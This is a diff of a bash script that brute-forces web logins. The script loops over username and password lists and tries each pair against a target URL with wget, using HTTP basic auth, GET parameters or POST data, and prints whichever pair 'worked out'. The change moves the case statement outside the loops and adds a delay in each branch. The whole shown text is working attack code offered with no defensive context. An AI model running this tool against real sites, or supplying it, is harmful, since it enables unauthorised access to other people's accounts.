@@ -49,35 +49,50 @@ fi
 
 echo "starting Attack on $protocol://$url"
 
-for username in $usernames
-do
-	for password in $passwords
-	do
-		case $attack_type in
-			http)
+case $attack_type in
+	http)
+		for username in $usernames
+		do
+			for password in $passwords
+			do
 				if wget --spider $protocol://$username:$password@$url &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
-				;;
-			get)
+				sleep "$delay"
+			done
+		done
+		;;
+	get)
+		for username in $usernames
+		do
+			for password in $passwords
+			do
 				if wget $protocol://$url?$post_or_get_username=$username&$post_or_get_password=$password &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
-				;;
-			post)
+				sleep "$delay"
+			done
+		done
+		;;
+	post)
+		for username in $usernames
+		do
+			for password in $passwords
+			do
 				if wget --post-data "$post_or_get_username=$username;$post_or_get_password=$password" $protocol://$url &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
-				;;
-			\?)
-				echo "invalid attack type: $attack_type"
-				exit
-				;;
-		esac
-		sleep "$delay"
-	done
-done
+				sleep "$delay"
+			done
+		done
+		;;
+	\?)
+		echo "invalid attack type: $attack_type"
+		exit
+		;;
+esac
+
 echo "didnt work."
